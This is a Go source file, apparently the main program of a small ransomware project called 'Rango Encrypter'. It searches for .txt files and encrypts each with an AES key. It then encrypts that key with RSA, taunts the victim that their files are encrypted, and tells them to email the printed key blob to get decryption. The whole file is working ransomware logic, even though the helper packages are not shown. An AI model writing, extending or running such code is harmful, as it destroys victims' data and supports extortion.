package main

import (
	"encoding/base64"
	"fmt"

	"github.com/guptswayam/rango/rango-encrypt/encrypter"
	"github.com/guptswayam/rango/shared"
)

func main() {
	fmt.Println("Starting Rango Encrypter!")

	fmt.Println("Rango is working...")

	fileList := shared.FindFiles(".txt")

	// generate the aes 32 byte key
	aes32Key := encrypter.GenerateKey()

	for i := range fileList {
		encrypter.EncryptFile(aes32Key, fileList[i].FolderPath, fileList[i].FileName)
	}

	fmt.Println("Haha! Your files has been encrypted")

	// Encode aes key using RSA
	encryptedAesKey := encrypter.RsaEncryption(aes32Key)

	// Output the aes 32 byte key in base64 format
	rsaEncryptedBase64AesKey := base64.StdEncoding.EncodeToString(encryptedAesKey)
	fmt.Println("Please send a mail to us to decrypt your files with following content:", rsaEncryptedBase64AesKey)

	fmt.Println("Closing Rango Encrypter!")

	var isFinish string = ""
	for isFinish != "yes" {
		fmt.Println("Type yes to close")
		fmt.Scanln(&isFinish)
	}

}
